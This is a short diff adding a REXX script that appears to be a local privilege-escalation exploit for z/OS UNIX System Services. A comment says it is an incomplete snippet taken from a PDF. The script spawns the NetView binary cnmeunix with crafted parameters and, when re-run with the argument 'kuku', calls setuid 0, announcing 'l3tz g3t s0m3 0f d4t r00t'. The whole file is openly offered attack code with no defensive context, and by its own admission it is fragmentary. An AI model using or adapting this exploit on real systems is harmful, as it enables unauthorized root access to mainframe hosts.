@@ -1,0 +1,18 @@
+/* REXX */
+/* from fup.pdf 
+   this file was in complete these are the only snipped that exist */
+call syscall 'ON'
+if __argv.2=='kuku' then do
+	address syscall 'setuid 0'
+
+
+say 'l3tz g3t s0m3 0f d4t r00t!@#'
+
+parm.0=2
+parm.1=__argv.1
+parm.2='kuku'
+env.0=1
+env.1='_BPC_SHAREAS=NO'
+
+address syscall 'spawn /usr/lpp/netview/v5r1/bin/cnmeunix 0 . parm. env.'
+address syscall 'wait wret.'
